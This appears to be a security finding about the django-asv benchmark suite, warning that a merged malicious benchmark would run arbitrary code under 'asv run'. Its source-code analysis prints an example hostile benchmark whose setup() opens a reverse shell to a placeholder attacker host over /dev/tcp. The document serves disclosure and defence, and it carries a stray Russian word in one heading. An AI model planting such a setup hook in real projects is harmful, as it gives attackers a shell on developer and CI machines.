- **Vulnerability Name:** Arbitrary Code Execution via Malicious Benchmark
- **Description:**
    1. An attacker submits a malicious pull request to the `django-asv` repository.
    2. This pull request includes a crafted benchmark file (e.g., `benchmark.py`) containing malicious Python code within a benchmark class and its methods (like `setup`, `time_*`, `mem_*`).
    3. A Django developer merges the pull request into the repository without thoroughly inspecting the benchmark code for malicious intent.
    4. The benchmarks are executed using the `asv run` command, either manually by a developer or automatically in a CI environment.
    5. `asv` discovers and executes the newly added malicious benchmark code as part of its benchmarking process.
    6. The malicious code is executed with the same privileges as the user running `asv run`, leading to arbitrary code execution on the developer's machine or the CI environment.
- **Impact:**
    Arbitrary code execution on the machine running the benchmarks. This could result in:
    *   **Confidentiality Breach:** Exfiltration of sensitive data from the developer's local machine or the CI environment, such as environment variables, secrets, source code, or other files accessible to the user running the benchmarks.
    *   **Integrity Violation:** Modification or deletion of critical files or configurations on the system.
    *   **Availability Disruption:**  System compromise, potentially leading to denial of service or disruption of development workflows.
    *   **Supply Chain Attack:** If the CI environment is compromised, it could be leveraged to inject malicious code into the Django project itself or its dependencies, leading to a broader supply chain attack.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    None. The project currently relies solely on the assumption that pull requests will be reviewed for correctness and benign intent, but there are no specific security measures in place to prevent or detect malicious benchmark code execution.
- **Missing Mitigations:**
    *   ** усиленный Code Review with Security Focus:** Implement mandatory, in-depth code reviews for all pull requests, specifically focusing on the security implications of benchmark code. Reviewers should be trained to identify potentially malicious code patterns in benchmark files.
    *   **Sandboxed Benchmark Execution:** Isolate the benchmark execution environment using sandboxing technologies. This could involve:
        *   **Containerization:** Running benchmarks within containers (like Docker) with restricted capabilities and resource limits.
        *   **Virtualization:** Executing benchmarks in virtual machines with minimal necessary tools and network access, offering a stronger isolation layer.
        *   **Restricted User Accounts:** Running benchmarks under dedicated, low-privilege user accounts with limited permissions on the system.
    *   **Static Analysis Security Testing (SAST):** Integrate static analysis tools into the development workflow to automatically scan benchmark code for suspicious patterns or known security vulnerabilities before execution. Tools could be configured to detect potentially dangerous function calls (e.g., `os.system`, `subprocess.call`, `eval`, `exec`) within benchmark files.
    *   **Input Validation and Sanitization (though less applicable to benchmark code itself, but consider benchmark definitions):** If benchmark definitions or parameters are ever sourced from external inputs (which is not apparent in the current project, but as a future consideration), ensure proper validation and sanitization to prevent injection attacks.
    *   **Principle of Least Privilege:** Grant only the necessary permissions to the benchmark execution environment and processes. Avoid running benchmarks with highly privileged accounts.
- **Preconditions:**
    *   **Pull Request Submission:** The attacker must be able to submit a pull request to the `django-asv` repository (which is generally open to contributions).
    *   **Pull Request Merging:** A maintainer or developer with merge privileges must merge the malicious pull request into the main repository. This often relies on human review, which can be bypassed if the malicious code is cleverly disguised or reviewers are not security-minded.
    *   **Benchmark Execution:**  Someone (developer or CI system) must subsequently execute the benchmarks using `asv run` after the malicious code has been merged into the codebase. This is a standard part of the benchmarking workflow, so it's a highly likely precondition to be met.
- **Source Code Analysis:**
    The core vulnerability lies in the way `asv` discovers and executes benchmark code. `asv` is designed to run arbitrary Python code found in `benchmark.py` files within the project. The provided code in `benchmarks/utils.py` using `bench_setup()` further initializes a Django environment, which provides a rich context for potential exploits if the attacker wants to interact with Django's settings, models, or database during benchmark execution.

    The `README.md` explicitly encourages contributions by describing how to write new benchmarks and submit pull requests. This lowers the barrier for attackers to submit malicious benchmarks.

    ```python
    # Example malicious benchmark code that could be placed in a benchmark.py file

    import os
    import subprocess

    class MaliciousBenchmark:
        def setup(self):
            # Example 1: Execute arbitrary shell command
            os.system("whoami > /tmp/whoami_output.txt")

            # Example 2: Reverse shell (simplified, requires attacker to listen on port 4444)
            subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1"])

        def time_benign_benchmark(self): # Name doesn't matter, setup is executed regardless of benchmark function run
            pass
    ```

    The above code, if placed in a `benchmark.py` file within the repository and executed by `asv run`, would execute the commands in the `setup()` method.  `asv` doesn't perform any security checks on the content of these `benchmark.py` files. The `asv run` command simply discovers and executes the Python code.

- **Security Test Case:**
    1. **Setup Test Environment:**  Set up a local development environment for `django-asv` as described in the `README.md`.
    2. **Fork Repository:** Fork the `django-asv` repository on GitHub.
    3. **Create Malicious Benchmark:** In your forked repository, create a new directory, e.g., `benchmarks/exploit_benchmark/`.
    4. **Create `__init__.py`:** Add an empty `__init__.py` file inside `benchmarks/exploit_benchmark/`.
    5. **Create `benchmark.py`:**  Create a `benchmark.py` file inside `benchmarks/exploit_benchmark/` with the following malicious code:

        ```python
        import os

        class ExploitBenchmark:
            def setup(self):
                # Attempt to create a marker file to verify code execution
                try:
                    with open("/tmp/malicious_benchmark_marker.txt", "w") as f:
                        f.write("Malicious benchmark executed!")
                except Exception as e:
                    print(f"Error writing marker file: {e}")

            def time_exploit(self): # time_ function is needed for asv to recognize benchmark, but content is irrelevant for this test
                pass
        ```
    6. **Modify `settings.py`:** Add `'benchmarks.exploit_benchmark'` to the `INSTALLED_APPS` list in `benchmarks/settings.py`. This will ensure the malicious benchmark is included in the project's Django setup.
    7. **Commit and Push:** Commit these changes to your forked repository and push them to GitHub.
    8. **Submit Pull Request (Optional for Local Testing):**  Submit a pull request from your fork to the main `django-asv` repository. For testing purposes, you can skip the pull request and test locally.
    9. **Run Benchmarks Locally:** Clone your forked repository (or the main one if you submitted and merged the PR for testing). Navigate to the repository directory in your terminal. Install `asv` if you haven't already (`pip install asv`). Run the benchmarks: `asv run`.
    10. **Verify Code Execution:** After `asv run` completes, check if the marker file `/tmp/malicious_benchmark_marker.txt` exists and contains the expected content "Malicious benchmark executed!".

        ```bash
        ls -l /tmp/malicious_benchmark_marker.txt
        cat /tmp/malicious_benchmark_marker.txt
        ```

        If the file exists and contains the message, it confirms that the malicious code in the `setup()` method of the benchmark was executed, demonstrating the arbitrary code execution vulnerability. For a less intrusive test, you could modify the malicious benchmark to simply print to standard output instead of writing a file.
